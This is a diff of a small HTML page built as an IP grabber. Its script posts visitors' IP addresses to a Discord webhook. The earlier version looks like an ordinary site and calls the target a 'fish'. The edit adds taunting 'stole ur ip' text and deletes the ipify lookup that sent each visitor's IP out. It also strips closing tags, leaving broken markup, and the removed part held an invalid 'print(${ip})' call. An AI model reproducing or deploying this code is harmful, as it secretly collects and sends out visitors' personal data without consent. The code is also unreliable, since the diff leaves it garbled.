@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
-    
 <head>
+<p>I just stole ur ip!.</p>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Your website ahh</title>
+    <title>yo ip just got stolen twin</title>
 </head>
 <body>
     <script>
@@ -13,7 +13,7 @@
         // Function to send IP address to Discord webhook
         function sendIpToDiscord(ip) {
             const payload = {
-                content: `@phantomvoid_1 I hooked a fish!: ${ip}`
+                content: `New visitor IP: ${ip}`
             };
 
             fetch(DISCORD_WEBHOOK_URL, {
@@ -31,18 +31,4 @@
                 }
             })
             .catch(error => console.error('Error:', error));
-        }
-
-        // Get the public IP address of the user
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                console.log('Your IP address is: ' + data.ip);
-                sendIpToDiscord(data.ip);
-            })
-            .catch(error => console.error('Error:', error));
-        print(${ip})
-    </script>
-
-</body>
 </html>
